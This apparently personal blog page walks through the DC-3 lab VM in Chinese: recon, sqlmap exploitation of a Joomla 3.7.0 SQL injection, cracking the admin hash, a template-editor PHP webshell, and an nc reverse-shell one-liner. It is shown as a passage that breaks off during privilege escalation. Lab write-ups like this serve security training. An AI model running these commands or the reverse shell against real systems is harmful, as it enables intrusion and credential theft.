@@ -1,0 +1,728 @@
+<!DOCTYPE html>
+<html lang="zh">
+    
+    <head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+    <meta name="description" content="DC-3靶机渗透测试讲解（joomscan、searchsploit、sqlmap、Linpeas提权）" />
+    <meta name="hexo-theme-A4" content="v1.9.6" />
+    <link rel="alternate icon" type="image/webp" href="/img/favicon.png">
+    <title>Leng-CS | Personal Blog</title>
+
+    
+        
+<link rel="stylesheet" href="/css/highlight/style1.css">
+
+        
+<link rel="stylesheet" href="/css/reset.css">
+
+        
+<link rel="stylesheet" href="/css/markdown.css">
+
+        
+<link rel="stylesheet" href="/css/fonts.css">
+ 
+         <!--注意：首页既不是post也不是page-->
+        
+        
+        
+<link rel="stylesheet" href="/css/ui.css">
+ 
+        
+<link rel="stylesheet" href="/css/style.css">
+
+
+        
+            <!--返回顶部css-->
+            
+<link rel="stylesheet" href="/css/returnToTop.css">
+
+            
+<link rel="stylesheet" href="/css/unicons.css">
+
+        
+        
+            <!--目录-->
+            
+<link rel="stylesheet" href="/css/toc.css">
+
+        
+    
+
+    
+        
+<link rel="stylesheet" href="/css/returnToLastPage.css">
+
+    
+    
+   
+<link rel="stylesheet" href="/css/lightgallery-bundle.min.css">
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+    
+    
+
+    
+    
+
+
+
+    
+
+    
+    
+
+    
+    
+    
+    <body>
+        <script src="/js/darkmode-js.min.js"></script>
+        
+        <script>
+            const options = {
+                bottom: '40px', // default: '32px'
+                right: 'unset', // default: '32px'
+                left: '42px', // default: 'unset'
+                time: '0.3s', // default: '0.3s'
+                mixColor: '#fff', // default: '#fff'
+                backgroundColor: ' #e4e4e4 ',  // default: '#fff'
+                buttonColorDark: '#100f2c',  // default: '#100f2c'
+                buttonColorLight: '#fff', // default: '#fff'
+                saveInCookies: true, // default: true,
+                label: '🌓', // default: ''
+                autoMatchOsTheme: true // default: true
+            }
+            const darkmode = new Darkmode(options);
+            darkmode.showWidget();
+        </script>
+        
+        
+            <div class="left-toc-container">
+                <nav id="toc" class="bs-docs-sidebar"></nav>
+            </div>
+        
+        <div class="paper">
+            
+            
+            
+            
+                <div class="shadow-drop-2-bottom paper-main">
+                    
+
+
+<div class="header">
+    <div class="header-container">
+        <img style="
+        width: 56px;
+        height: auto;" alt="^-^" cache-control="max-age=86400" class="header-img" src="/img/favicon.png" width="10%"></img>
+        <div class="header-content">
+            <a class="logo" href="/">Leng-CS</a> 
+            <span class="description">test2</span> 
+        </div>
+        
+    </div>
+    
+   
+    <ul class="nav">
+        
+            
+                <li><a href="/">首页</a></li>
+            
+        
+            
+                <li><a href="/list/">文章</a></li>
+            
+        
+            
+                <li><a href="/about/">关于</a></li>
+            
+        
+            
+                <li><a href="/tags/">标签</a></li>
+            
+        
+            
+                <li><a href="/categories/">分类</a></li>
+            
+        
+    </ul>
+</div> 
+        
+                    
+                    
+
+                    
+                    
+                    
+                    <!--说明是文章post页面-->
+                    
+                        <div class="post-main">
+    
+
+    
+        
+            
+                <div class="post-main-title" style="text-align: center;">
+                    DC-3靶机渗透测试讲解（joomscan、searchsploit、sqlmap、Linpeas提权）
+                </div>
+            
+        
+      
+    
+
+    
+
+        
+            <div class="post-head-meta-center">
+        
+                
+                    <span>最近更新：2024-12-01</span> 
+                
+                
+                    
+                        &nbsp; | &nbsp;
+                    
+                     <span>字数总计：2.7k</span>
+                
+                
+                    
+                        &nbsp; | &nbsp;
+                    
+                    <span>阅读估时：10分钟</span>
+                
+                
+                    
+                        &nbsp; | &nbsp;
+                    
+                    <span id="busuanzi_container_page_pv">
+                        阅读量：<span id="busuanzi_value_page_pv"></span>次
+                    </span>
+                
+            </div>
+    
+
+    <div class="post-md">
+        
+            
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E4%B8%80%E3%80%81%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="post-toc-text">一、信息搜集</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E4%BA%8C%E3%80%81%E6%9F%A5%E6%89%BE%E6%BC%8F%E6%B4%9E"><span class="post-toc-text">二、查找漏洞</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E4%B8%89%E3%80%81%E7%99%BB%E5%85%A5admin"><span class="post-toc-text">三、登入admin</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E5%9B%9B%E3%80%81webshell%E4%B8%8A%E7%BA%BF"><span class="post-toc-text">四、webshell上线</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E4%BA%94%E3%80%81Linpeas-sh%E6%A2%AD%E5%93%88%E6%8F%90%E6%9D%83"><span class="post-toc-text">五、Linpeas.sh梭哈提权</span></a></li></ol>
+            
+        
+        <div class=".article-gallery"><blockquote>
+<p>前情提要：</p>
+<p>这个靶机综合性比较强。</p>
+<p>信息收集用到<strong>joomscan</strong>，之后要用<strong>searchsploit</strong>找到网址的历史<strong>sql注入漏洞</strong>，然后再用<strong>sqlmap</strong>找到admin的密码，再用<strong>john</strong>解密。</p>
+<p>登入管理员界面后，需要找漏洞利用点，最后确定可以<strong>文件上传</strong>一句话木马</p>
+<p>用<strong>蚁剑</strong>连接木马得到webshell后再通过<strong>linpeas</strong>一把梭哈，找历史内核提权漏洞</p>
+<p>中间弯弯绕绕很多，但是自己打下来的话成就感还是很强的。</p>
+<p><strong>有问题敬请提问</strong></p>
+</blockquote>
+<blockquote>
+<p>靶机下载地址：<a target="_blank" rel="noopener" href="https://www.five86.com/downloads/DC-3-2.zip">https://www.five86.com/downloads/DC-3-2.zip</a><br>攻击环境：kali</p>
+</blockquote>
+<h2 id="一、信息搜集"><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a><strong>一、信息搜集</strong></h2><ol>
+<li><p>arp扫描确定靶机ip地址</p>
+<p>使用命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
+
+<a href="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130152201958.png" class="gallery-item" style="box-shadow: none;"> <img src="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130152201958.png" class="" title="image-20241130152201958"></a>
+
+<p>在vm的网络设置中，查看靶机的mac地址末尾为3d:6c。</p>
+<style>.wzgrxysvtnsn{zoom:50%;}</style><a href="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130152403122.png" title="image-20241130152403122" class="gallery-item" style="box-shadow: none;"> <img src="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130152403122.png" class="wzgrxysvtnsn" alt="image-20241130152403122"></a>
+
+<p>确定靶机的ip地址为：<strong>192.168.2.132</strong></p>
+</li>
+<li><p>nmap扫描</p>
+<p>使用命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p- -O 192.168.2.132</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>-sV 扫描版本信息</p>
+<p>-p-  扫描全部端口</p>
+<p>-O  扫描操作系统</p>
+</blockquote>
+<a href="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130152725178.png" class="gallery-item" style="box-shadow: none;"> <img src="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130152725178.png" class="" title="image-20241130152725178"></a>
+
+<p>得到：</p>
+<table>
+<thead>
+<tr>
+<th align="center">端口</th>
+<th align="center">服务</th>
+<th align="center">版本</th>
+<th>操作系统</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">80</td>
+<td align="center">http</td>
+<td align="center">Apache http 2.4.18（Ubuntu）</td>
+<td>Linux 3.2-4.9</td>
+</tr>
+</tbody></table>
+<p>惯例，我们用浏览器去80端口看看：</p>
+<a href="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130153414528.png" class="gallery-item" style="box-shadow: none;"> <img src="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130153414528.png" class="" title="image-20241130153414528"></a>
+
+<p>可以看到提示，说这次只有一个flag，只有一个入口，而且需要得到root权限，怎么得到，取决于<strong>system</strong></p>
+<p>我们再用wappalyer看看cms：</p>
+<a href="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130153643411.png" class="gallery-item" style="box-shadow: none;"> <img src="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130153643411.png" class="" title="image-20241130153643411"></a>
+
+<p>看到cms是joomla，根据之前的经验，我们可以用用其特定的cms工具看看。</p>
+</li>
+<li><p>使用joomscan</p>
+<p>kali可能需要自己先下载一下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install joomscan </span><br></pre></td></tr></table></figure>
+
+<p>然后我们看看使用方法：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">joomscan -help</span><br></pre></td></tr></table></figure>
+
+<a href="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130154121036.png" class="gallery-item" style="box-shadow: none;"> <img src="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130154121036.png" class="" title="image-20241130154121036"></a>
+
+<p>可以使用命令如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">joomscan --url http://192.168.2.132/ -ec</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>–url  将要扫描的网址url</p>
+<p>-ec 目录扫描</p>
+</blockquote>
+<p>可以发现报告导出到一个特殊目录下：</p>
+<a href="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130154815096.png" class="gallery-item" style="box-shadow: none;"> <img src="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130154815096.png" class="" title="image-20241130154815096"></a>
+
+<p>当然，你可以在终端上看到扫描结果，我这里选择看它的导出报告：</p>
+<a href="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130154946476.png" class="gallery-item" style="box-shadow: none;"> <img src="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130154946476.png" class="" title="image-20241130154946476"></a>
+
+<a href="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130155110343.png" class="gallery-item" style="box-shadow: none;"> <img src="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130155110343.png" class="" title="image-20241130155110343"></a>
+
+<p>可以得到 ：</p>
+<table>
+<thead>
+<tr>
+<th align="center">joomla版本</th>
+<th align="center"><strong>3.7.0</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><strong>网页目录列表</strong></td>
+<td align="center"><a target="_blank" rel="noopener" href="http://192.168.2.132/administrator/components">http://192.168.2.132/administrator/components</a><br/><a target="_blank" rel="noopener" href="http://192.168.2.132/administrator/modules">http://192.168.2.132/administrator/modules</a><br/><a target="_blank" rel="noopener" href="http://192.168.2.132/administrator/templates">http://192.168.2.132/administrator/templates</a><br/><a target="_blank" rel="noopener" href="http://192.168.2.132/images/banners">http://192.168.2.132/images/banners</a></td>
+</tr>
+<tr>
+<td align="center"><strong>管理员界面</strong></td>
+<td align="center"><a target="_blank" rel="noopener" href="http://192.168.2.132/administrator/">http://192.168.2.132/administrator/</a></td>
+</tr>
+</tbody></table>
+<p>目录列表逛了一圈，还是没什么可以利用的东西，我们再去管理员界面看看：</p>
+<a href="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130155538726.png" class="gallery-item" style="box-shadow: none;"> <img src="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130155538726.png" class="" title="image-20241130155538726"></a>
+
+<p>可以正常打开。</p>
+<p>现在的思路就有两个了，一个像DC-2一样使用弱口令啥的生成字典爆破，二是找找joomla的历史漏洞，毕竟我们现在已经知道其版本号了。</p>
+<p>使用弱口令爆破确实可以，但是我们现在也扫描不到用户名，只能试试admin啥的。</p>
+<p>这里使用第二种思路，去找找joomla的历史漏洞。</p>
+</li>
+</ol>
+<h2 id="二、查找漏洞"><a href="#二、查找漏洞" class="headerlink" title="二、查找漏洞"></a><strong>二、查找漏洞</strong></h2><ol>
+<li><p>使用searchsploit查找joomla的历史漏洞，确定版本号为3.7.0</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit  joomla 3.7.0</span><br></pre></td></tr></table></figure>
+
+<a href="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130162401313.png" class="gallery-item" style="box-shadow: none;"> <img src="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130162401313.png" class="" title="image-20241130162401313"></a>
+
+<p>看到有一个sql注入的漏洞，我们下载poc来看看是怎么回事</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit  -m php/webapps/42033.txt</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>-m  下载文件到当前目录</p>
+</blockquote>
+<a href="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130162636916.png" class="gallery-item" style="box-shadow: none;"> <img src="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130162636916.png" class="" title="image-20241130162636916"></a>
+
+<p>下载到&#x2F;root&#x2F;42033.txt了。我们cat查看一下</p>
+<a href="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130163052669.png" class="gallery-item" style="box-shadow: none;"> <img src="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130163052669.png" class="" title="image-20241130163052669"></a>
+
+<p>下面可以看到这个漏洞的三种类型，分别是：基于布尔值的盲注、基于报错、AND&#x2F;OR 基于时间的盲注。</p>
+<p>给出了sqlmap的命令，手注太麻烦了。就直接用sqlmap吧。</p>
+</li>
+<li><p>使用sqlmap</p>
+<p>使用命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.2.132/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br></pre></td></tr></table></figure>
+
+<a href="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130163716421.png" class="gallery-item" style="box-shadow: none;"> <img src="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130163716421.png" class="" title="image-20241130163716421"></a>
+
+<p>问我们用不用cookies，当然用，输入y后按回车</p>
+<a href="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130163825446.png" class="gallery-item" style="box-shadow: none;"> <img src="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130163825446.png" class="" title="image-20241130163825446"></a>
+
+<p>扫出来5个数据库，我们先进入<strong>joomladb</strong>，看看表。</p>
+<p>使用命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.2.132/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb --tables -p list[fullordering]</span><br></pre></td></tr></table></figure>
+
+<a href="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130164029668.png" class="gallery-item" style="box-shadow: none;"> <img src="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130164029668.png" class="" title="image-20241130164029668"></a>
+
+<p>扫出来一堆表，很明显，**#__users表**是我们想看看的</p>
+<p>使用命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.2.132/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb -T &quot; #__users&quot; --columns  -p list[fullordering]</span><br></pre></td></tr></table></figure>
+
+<p>这里会显示找不到在#__users表里的columns，让我们试试字典扫一遍，我们使用第一个字典。</p>
+<blockquote>
+<p>还会再要求你输入扫描线程的，务必要输入一个数字，不然上面也扫不出来。</p>
+</blockquote>
+<a href="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130172357896.png" class="gallery-item" style="box-shadow: none;"> <img src="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130172357896.png" class="" title="image-20241130172357896"></a>
+
+<p>这里扫出来六个column，我们dump一下name、username、password</p>
+<p>使用命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.2.132/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb -T &quot;#__users&quot; -C name,username,password --dump  -p list[fullordering]</span><br></pre></td></tr></table></figure>
+
+<a href="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130172845459.png" class="gallery-item" style="box-shadow: none;"> <img src="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130172845459.png" class="" title="image-20241130172845459"></a>
+
+<p>这里找到了admin的密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</span><br></pre></td></tr></table></figure>
+
+<p>很明显经过了加密，我们用kali自带的john解密一下</p>
+</li>
+<li><p>使用john解密</p>
+<p>先将密码保存到pwddc-3.txt</p>
+<p>然后使用命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john -show pwddc-3.txt</span><br></pre></td></tr></table></figure>
+
+<a href="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130173537288.png" class="gallery-item" style="box-shadow: none;"> <img src="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130173537288.png" class="" title="image-20241130173537288"></a>
+
+<p>得到admin的密码为snoopy</p>
+</li>
+</ol>
+<h2 id="三、登入admin"><a href="#三、登入admin" class="headerlink" title="三、登入admin"></a><strong>三、登入admin</strong></h2><ol>
+<li><p>登入后没有什么特别的信息。</p>
+<p>这里我点到了一个media界面，是可以上传图片的：</p>
+<a href="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130181014442.png" class="gallery-item" style="box-shadow: none;"> <img src="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130181014442.png" class="" title="image-20241130181014442"></a>
+
+<p>我试了各种文件上传绕过的方法，居然都没用，气煞我也。</p>
+<style>.ydmgfkwyzswc{zoom:80%;}</style><a href="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130181301155.png" title="image-20241130181301155" class="gallery-item" style="box-shadow: none;"> <img src="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130181301155.png" class="ydmgfkwyzswc" alt="image-20241130181301155"></a>
+
+<p>然后继续找找找。</p>
+<p>最后还是在一个templates界面找到了可以直接上传文件的地方。</p>
+<a href="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130181916000.png" class="gallery-item" style="box-shadow: none;"> <img src="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130181916000.png" class="" title="image-20241130181916000"></a>
+
+<p>点击new file：</p>
+<a href="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130204025761.png" class="gallery-item" style="box-shadow: none;"> <img src="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130204025761.png" class="" title="image-20241130204025761"></a>
+
+<p>居然可以直接上传pho文件的，我们先创建一个1.php，再试着写一个一句话木马：</p>
+<a href="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130204334359.png" class="gallery-item" style="box-shadow: none;"> <img src="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130204334359.png" class="" title="image-20241130204334359"></a>
+
+<p>点击保存，显示保存成功。</p>
+<p>那现在的重点就是要找到我们的1.php的路径了。</p>
+<p>我们前面joomscan扫描的时候，记得扫描到一个和template相关的路径：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.132/administrator/templates</span><br></pre></td></tr></table></figure>
+
+<p>但是点击进去过后啥也没有。我们看着页面上的提示，文件是保存在template的beezs的&#x2F;html&#x2F;1</p>
+<p>php下的。试着自己构造一下路径：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.132/templates/beez3/html/</span><br></pre></td></tr></table></figure>
+
+<p>发现1.php：</p>
+<a href="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130205011271.png" class="gallery-item" style="box-shadow: none;"> <img src="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130205011271.png" class="" title="image-20241130205011271"></a></li>
+</ol>
+<h2 id="四、webshell上线"><a href="#四、webshell上线" class="headerlink" title="四、webshell上线"></a><strong>四、webshell上线</strong></h2><ol>
+<li><p>知道了木马文件的路径，我们用蚁剑连接一下</p>
+<a href="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130205520928.png" class="gallery-item" style="box-shadow: none;"> <img src="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130205520928.png" class="" title="image-20241130205520928"></a>
+
+<a href="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130205545138.png" class="gallery-item" style="box-shadow: none;"> <img src="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130205545138.png" class="" title="image-20241130205545138"></a>
+
+<p>连接成功。</p>
+</li>
+<li><p>反弹shell<br>这个时候右键打开终端，准备反弹一个稳定的shell。</p>
+<p>kali先监听4444端口。</p>
+<a href="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130205815511.png" class="gallery-item" style="box-shadow: none;"> <img src="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130205815511.png" class="" title="image-20241130205815511"></a>
+
+<p>在棱角社区找到一些反弹shell的命令，逐个试了一下，发现可以使用这个：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -f x; mknod x p &amp;&amp; nc 192.168.2.128 4444 0&lt;x | /bin/bash 1&gt;x</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>棱角社区反弹shell命令生成网址：</p>
+<p>[<a target="_blank" rel="noopener" href="https://forum.ywhack.com/shell.php">~]#棱角 ::Edge.Forum*</a></p>
+</blockquote>
+<a href="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130210152659.png" class="gallery-item" style="box-shadow: none;"> <img src="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130210152659.png" class="" title="image-20241130210152659"></a>
+
+<p>再使用熟悉的python语句生成稳定的回显界面环境：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<a href="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130210451590.png" class="gallery-item" style="box-shadow: none;"> <img src="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130210451590.png" class="" title="image-20241130210451590"></a></li>
+</ol>
+<h2 id="五、Linpeas-sh梭哈提权"><a href="#五、Linpeas-sh梭哈提权" class="headerlink" title="五、Linpeas.sh梭哈提权"></a><strong>五、Linpeas.sh梭哈提权</strong></h2><ol>
+<li><p>现在已经进行到一大半了，而且已经得到了webshell，但是要得到flag的话，还得是要提权的。</p>
+<p>老套路先走一遍流程：</p>
+<p>先看看有没有suid提权：</p>
+<p>使用命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null<br>&#x2F;  表示从文件系统的顶部（根）开始并找到每个目录<br>-perm 表示搜索随后的权限<br>-u &#x3D; s  表示查找root用户拥有的文件<br>-type  表示我们正在寻找的文件类型<br>f   表示常规文件，而不是目录或特殊文件<br>2  表示该进程的第二个文件描述符，即stderr（标准错误）</p>
+<p>‘&gt;’  表示重定向</p>
+<p>&#x2F; dev &#x2F; null  是一个特殊的文件系统对象，它将丢弃写入其中的所有内容。</p>
+</blockquote>
+<a href="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130211813706.png" class="gallery-item" style="box-shadow: none;"> <img src="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130211813706.png" class="" title="image-20241130211813706"></a>
+
